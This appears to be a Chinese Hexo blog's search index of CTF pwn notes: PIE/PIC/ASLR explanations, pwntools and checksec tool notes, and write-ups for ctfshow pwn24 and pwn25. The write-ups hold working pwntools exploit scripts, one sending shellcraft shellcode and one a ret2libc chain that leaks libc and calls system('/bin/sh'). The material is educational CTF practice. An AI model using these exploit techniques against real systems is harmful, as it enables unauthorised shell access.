<h2 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h2><h3 id="PIE是什么？"><a href="#PIE是什么？" class="headerlink" title="PIE是什么？"></a>PIE是什么？</h3><p>还是来自刚才的来自<a href="https://blog.csdn.net/weixin_43921239/article/details/103813046">博客(csdn)</a>。</p>
<p><strong>PIE 是 gcc 编译器的功能选项，作用于程序（ELF）编译过程中。是一个针对代码段（ .text ）、数据段（ .data ）、未初始化全局变量段（ .bss ）等固定地址的一个防护技术</strong>。</p>
<p>如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过 ROPgadget 等一些工具来帮助解题。</p>
<h3 id="PIE与PIC的区别是什么？"><a href="#PIE与PIC的区别是什么？" class="headerlink" title="PIE与PIC的区别是什么？"></a>PIE与PIC的区别是什么？</h3><p>另一个<a href="https://www.cnblogs.com/rec0rd/p/7646857.html">博客(cnblogs)</a>的定义：</p>
<ul>
<li>PIE（Position Independent Executables）是<strong>编译器（gcc，..）功能选项（-fPIE）</strong>，<strong>作用于excutable编译过程</strong>，可将其理解为<strong>特殊的PIC（so专用，Position Independent Code）</strong>，加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。</li>
</ul>
<p><strong>也就是说，PIC还可以用于编译动态库(.so等)，但PIE只能用于编译ELF。</strong></p>
<h3 id="gcc编译时关于PIE和PIC的控制"><a href="#gcc编译时关于PIE和PIC的控制" class="headerlink" title="gcc编译时关于PIE和PIC的控制"></a>gcc编译时关于PIE和PIC的控制</h3><p>借鉴了别人的<a href="https://www.cnblogs.com/20170722-kong/articles/12291904.html">博客</a>和另一个<a href="https://blog.csdn.net/tabactivity/article/details/126660974">博客</a></p>
<p>我没看懂怎么对PIE进行编译控制，这里引用后者博客的内容。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				      // 默认情况下看系统，一般是开到2</span><br><span class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		    // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		    // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></p>
<h2 id="最后，ASLR和PIE、PIE的异同点总结"><a href="#最后，ASLR和PIE、PIE的异同点总结" class="headerlink" title="最后，ASLR和PIE、PIE的异同点总结"></a>最后，ASLR和PIE、PIE的异同点总结</h2><ul>
<li>异同点：<ul>
<li>同：他们都代表着地址随机化的技术。</li>
<li>异：他们层次不同，一个是系统层次的功能，另两个是编译器给出的选项，技术细节也可能有所不同。</li>
</ul>
</li>
<li>他们能同时开吗？当然可以，也就是（ASLR+PIE/ASLR+PIC）这样子的。<ul>
<li>原先ASLR早于PIE出现，有return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等绕过ASLR的技术，而在ASLR+PIE之后，这些bypass技术就都失效了，只能借助其他的信息泄露漏洞泄露基址（常用libc基址）。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>PIE</tag>
        <tag>ASLR</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-pwn24 WP</title>
    <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="题面提示"><a href="#题面提示" class="headerlink" title="题面提示"></a>题面提示</h2><p>题目给出提示可以使用shellcraft脚本生成shell。</p>
<h2 id="分析pwn文件"><a href="#分析pwn文件" class="headerlink" title="分析pwn文件"></a>分析pwn文件</h2><p>使用<code>exeinfope</code>查看可执行文件类型。发现是32位elf文件</p>
<p>使用<code>IDA</code>对pwn文件反编译。</p>
<p>看到hint：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint  : NX disabled &amp; Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>结合题目提示发现可能是ret2text的题型。</p>
<p>进入ctfshow函数中，IDA无法生成该函数的伪代码，其汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buf= byte ptr -88h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">sub     esp, 84h</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    100h            ; nbytes</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">call    eax</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<ul>
<li>发现该函数用<code>_read</code>读入了buf字符串，然后用<code>_puts</code>函数输出了buf字符串。</li>
<li><strong>最关键的是：第四个<code>call</code>直接将buf字符串（数据段）当作代码段执行</strong></li>
</ul>
<p>确定是ret2text的题型，现在只需要输入shell执行代码的机器码即可</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28174&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/1.png" alt=""></p>
<center>拿到shell</center>

<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/2.png" alt=""></p>
<center>拿到flag</center>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>wp</tag>
        <tag>ret2text</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-pwn25 WP</title>
    <url>/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/</url>
    <content><![CDATA[<h1 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h1><p>主要探究了问题中偏移量与自己知识中的偏移量不同的原因。</p>
<p>介绍了一种确定偏移量的方法。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="对程序进行反编译并找到思路"><a href="#对程序进行反编译并找到思路" class="headerlink" title="对程序进行反编译并找到思路"></a>对程序进行反编译并找到思路</h2><h3 id="exeinfope"><a href="#exeinfope" class="headerlink" title="exeinfope"></a>exeinfope</h3><p>使用exeinfope查看程序，发现是elf32位程序。</p>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>打开ida进行反编译。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现ctfshow函数中有典型的输入溢出风险。</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>使用checksec工具查看elf文件信息：</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/checksec.png" alt="checksec结果"></p>
<p>发现打开了NX，不能执行数据段，于是想到ret2libc。</p>
<h2 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h2><h3 id="疑惑的开始"><a href="#疑惑的开始" class="headerlink" title="疑惑的开始"></a>疑惑的开始</h3><p>我先行查看了<a href="https://blog.csdn.net/weixin_52635170/article/details/131295889">别人的wp</a><br>发现其确定的$offset$是$140$，但是根据我之前的学习（<a href="https://zhuanlan.zhihu.com/p/25816426">有关栈溢出的知乎文章</a>），我认为的$offset$应该为$136(132(buf)+4(ebp))$</p>
<h3 id="使用工具cyclic初步确定偏移量"><a href="#使用工具cyclic初步确定偏移量" class="headerlink" title="使用工具cyclic初步确定偏移量"></a>使用工具cyclic初步确定偏移量</h3><p>使用工具cyclic是借鉴了<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">另一篇wp</a></p>
<p>cyclic是pwngdb内的工具。</p>
<p>使用效果如图</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic1.png" alt="使用cyclic"></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic2.png" alt="使用cyclic"></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic3.png" alt="使用cyclic"></p>
<p>发现$offset$确为$140$</p>
<h3 id="查明原因"><a href="#查明原因" class="headerlink" title="查明原因"></a>查明原因</h3><p>对程序进行gdb调试。<br>如图（此处是ctfshow()函数调用read()函数的时候，与main()调用ctfshow()同理）</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/gdb.png" alt="gdb"></p>
<p>发现多的那$4$的$offset$是用来存储.got.plt的偏移量了。</p>
<p>此处偏移量为$0$是因为主函数不同于其他部分，在编译时其.got.plt表和.plt表都已经重定向到了具体位置，不需要再延迟重定向，但仍需要给出偏移量，所以此处偏移量为$0$。（根据<a href="https://zhuanlan.zhihu.com/p/558522498">知乎大佬的文章</a>）</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>使用pwntools和libcsearcher两个模块给出payload脚本。</p>
<p>思路：先利用ret2libc的思路，转到puts函数输出puts自己的地址，利用puts的地址确定libc动态库版本。</p>
<p>再直接调出system()和”/bin/sh”的地址再进行一次ret2libc拿到shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28216&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_v = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc_v.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc_v.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc_v.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>wp</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn26-31 WP</title>
    <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn26-31-WP/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>ASLR</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具1 pwntools模块</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B71-pwntools%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><ul>
<li><code>pwntools</code>的安装</li>
<li><code>pwntools</code>的组件</li>
</ul>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="pwntools的安装"><a href="#pwntools的安装" class="headerlink" title="pwntools的安装"></a><code>pwntools</code>的安装</h2><p><code>pwntools</code>是基于python的一个包，我们可以用<code>pip install</code>来安装这个包。</p>
<p>坑：在 Manjaro 22、Ubuntu 23.04、Fedora 38等最新的linux发行版中运行<code>pip install</code>时，通常会收到一个错误提示：<code>error: externally-managed-environment</code>，即“外部管理环境”错误，但这不是一个 bug。</p>
<p>解决办法：</p>
<ol>
<li>直接去除警告。<strong>缺点是包装多了可能会产生混乱</strong></li>
<li>使用<code>pipx</code>，<strong>缺点是这个只适用于命令行，脚本中无法使用import引用包</strong></li>
<li>使用<code>venv</code>创建虚拟环境。（我选择为pwn单独建一个环境）<ul>
<li><code>apt install python3-venv</code></li>
<li><code>python3 -m venv 目录</code>，该指令会在目录中创建一个python虚拟环境。</li>
<li>进入虚拟环境所在的目录，使用<code>source bin/activate</code>来进入虚拟环境，然后<code>pip install</code>即可正常使用。</li>
<li>关闭当前shell或使用<code>deactivate</code>即可退出虚拟环境。</li>
</ul>
</li>
</ol>
<p>总之大费周章最后终于装完了。</p>
<h2 id="pwntools的组件"><a href="#pwntools的组件" class="headerlink" title="pwntools的组件"></a><code>pwntools</code>的组件</h2><p>命令行中输入<code>pwn</code>可以看到pwntools中包括的工具。<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,libcdb,phd,pwnstrip,scramble,shellcraft,template,unhex</span><br></pre></td></tr></table></figure></p>
<h3 id="checksec工具"><a href="#checksec工具" class="headerlink" title="checksec工具"></a><code>checksec</code>工具</h3><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-checksec/" title="pwn工具3 checksec">checksec介绍</a>
<h3 id="cyclic工具"><a href="#cyclic工具" class="headerlink" title="cyclic工具"></a><code>cyclic</code>工具</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">使用cyclic的实践-ctfshow-pwn25(ret2libc)</a>
<h3 id="shellcraft工具"><a href="#shellcraft工具" class="headerlink" title="shellcraft工具"></a><code>shellcraft</code>工具</h3><a href="/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/" title="ctfshow-pwn24 WP">使用shellcraft的实践-ctfshow-pwn24(ret2text)</a>
<h3 id="敬请期待，还没用到"><a href="#敬请期待，还没用到" class="headerlink" title="敬请期待，还没用到"></a>敬请期待，还没用到</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具2 pwngdb</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B72-pwngdb/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>pwn工具3 checksec</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-checksec/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文大量参考<a href="https://blog.csdn.net/tabactivity/article/details/126660974">博客1</a>和<a href="https://blog.csdn.net/samlirongsheng/article/details/120431377">博客2</a></p>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文主要介绍：工具<code>checksec</code></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="工具checksec"><a href="#工具checksec" class="headerlink" title="工具checksec"></a>工具<code>checksec</code></h2><h3 id="安装checksec"><a href="#安装checksec" class="headerlink" title="安装checksec"></a>安装<code>checksec</code></h3><p><code>checksec</code>可以独立安装，但是<code>pwntools</code>已经将其打包了，其中集成了大量pwn手用的工具，所以我们直接安装<code>pwntools</code>即可</p>
<h3 id="工具checksec的显示"><a href="#工具checksec的显示" class="headerlink" title="工具checksec的显示"></a>工具<code>checksec</code>的显示</h3><p><img src="/image/post/ctf/pwn/tools/003/1.png" alt=""></p>
<center>checksec的显示</center>

<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>想要进一步查看<code>checksec</code>显示的信息，请继续阅读另一篇文章：<br><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/" title="pwn知识点1 elf的安全属性">elf的安全属性</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具4 readelf</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B74-readelf/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>pwn工具5 objdump</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B75-objdump/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
